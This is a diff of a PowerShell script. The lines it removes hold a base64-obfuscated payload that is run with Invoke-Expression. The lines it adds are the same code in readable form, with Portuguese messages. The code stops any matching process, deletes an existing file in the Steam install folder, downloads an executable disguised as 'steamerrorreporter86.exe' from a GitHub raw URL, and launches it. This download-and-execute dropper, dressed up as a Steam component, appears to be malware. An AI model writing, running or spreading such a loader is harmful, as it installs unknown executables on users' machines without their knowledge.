@@ -1,6 +1,35 @@
-$enc = "JGRpcmV0b3JpbyA9ICJDOlxcUHJvZ3JhbSBGaWxlcyAoeDg2KVxTdGVhbSIKJHVybCA9ICJodHRwczovL3Jhdy5naXRodWIuY29tL3N1cGVybWFuLWxlZ2l0L2Vvc21lbm9ybWluaXVzaHBlY2luaGFmaWxkYXB1dGEvcmVmcy9oZWFkcy9tYWluL3N0ZWFtZXJyb3JyZXBvcnRlcjg2LmV4ZSIKJGNhbWluaG9BcmlxdWl2byA9IEpvaW4tUGF0aCAtUGF0aCAkZGlyZXRvcmlvIC1DaGlsZFBhdGggInN0ZWFtZXJyb3JyZXBvcnRlcjg2LmV4ZSIKCmlmICgtbm90IChUZXN0LVBhdGggLVBhdGggJGRpcmV0b3JpbykpIHsKICAgIFdyaXRlLUhvc3QgIkRpcmV0w7NvIG7Do28gZW5jb250cmFkbyBvdSBuw6NvIGFjZXNzw612ZWwuIENlcnRpZmlxdWUgbyBkZSBleGVjdXRhciBvIFBvd2VyU2hlbGwgY29tbyBBZG1pbmlzdHJhZG9yLiIKICAgIGV4aXQKfQoKJHByb2Nlc3NvID0gR2V0LVByb2Nlc3MgfCBXaGVyZS1PYmplY3QgeyAkXy5QYXRoIC1lcSAkY2FtaW5ob0FycXVpdm8gfQoKaWYgKCRwcm9jZXNzbykgewogICAgV3JpdGUtSG9zdCAiTyBhcnF1aXZvIGVzdMOzIHVzYWRvIHBvciB1bSBwcm9jZXNzby4gVGVudGFuZG8gZmluYWxpemFyIG8gcHJvY2Vzc28uLi4iCiAgICBTdG9wLVByb2Nlc3MgLU5hbWUgJHByb2Nlc3NvLk5hbWUgLUZvcmNlCn0KCmlmIChUZXN0LVBhdGggJGNhbWluaG9BcmlxdWl2bykgewogICAgV3JpdGUtSG9zdCAiUmVtb3ZlbmRvIG8gYXJxdWl2byBhbmd0byBhbnRlcyBkZSBiYWlhci4uLiIKICAgIFJlbW92ZS1JdGVtICRjYW1pbmhvQXJxdWl2byAtRm9yY2UKfQoKdHJ5IHsKICAgIFdyaXRlLUhvc3QgIkJhaXhhbmRvIG8gYXJxdWl2byBjb20gc3VjZXNzby4gRXhlY3V0YW5kbyBvIGFy
-cXVpdm8uLi4iCiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgJGNhbWluaG9BcmlxdW8KCiAgICBpZiAoVGVzdC1QYXRoICRjYW1pbmhvQXJxdWl2bykgewogICAgICAgIFN0YXJ0LVByb2Nlc3MgJGNhbWluaG9BcmlxdW8KICAgIH0KICAgIGVsc2UgewogICAgICAgIFdyaXRlLUhvc3QgIkZhbGhhIG5vIGRvd25sb2FkLiBPIGFy
-cXVpdm8gbmPDrSBmb2kgZW5jb250cmFkbyBhcsOtdmVzIGFw6XMgYSB0ZW50YXRpdmEuIgogICAgfQp9CmNhdGNoIHsKICAgIFdyaXRlLUhvc3QgIkZhbGhhIG5vIGRvd25sb2FkLiBDaGVxdWUgbyBlcnJvOiAkXyIKfQo="
-$bytes = [System.Convert]::FromBase64String($enc)
-$decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
-Invoke-Expression $decoded
+$diretorio = "C:\Program Files (x86)\Steam"
+$url = "https://raw.githubusercontent.com/superman-legit/eosmenorminimushpecinhafilhadaputa/refs/heads/main/steamerrorreporter86.exe"
+$caminhoArquivo = Join-Path -Path $diretorio -ChildPath "steamerrorreporter86.exe"
+
+if (-not (Test-Path -Path $diretorio)) {
+    Write-Host "Diretório não encontrado ou não acessível. Certifique-se de executar o PowerShell como Administrador."
+    exit
+}
+
+$processo = Get-Process | Where-Object { $_.Path -eq $caminhoArquivo }
+
+if ($processo) {
+    Write-Host "O arquivo está sendo usado por um processo. Tentando finalizar o processo..."
+    Stop-Process -Name $processo.Name -Force
+}
+
+if (Test-Path $caminhoArquivo) {
+    Write-Host "Removendo o arquivo antigo antes de baixar..."
+    Remove-Item $caminhoArquivo -Force
+}
+
+try {
+    Write-Host "Baixando o arquivo com sucesso. Executando o arquivo..."
+    Invoke-WebRequest -Uri $url -OutFile $caminhoArquivo
+
+    if (Test-Path $caminhoArquivo) {
+        Start-Process $caminhoArquivo
+    }
+    else {
+        Write-Host "Falha no download. O arquivo não foi encontrado após a tentativa."
+    }
+}
+catch {
+    Write-Host "Falha no download. Cheque o erro: $_"
+}
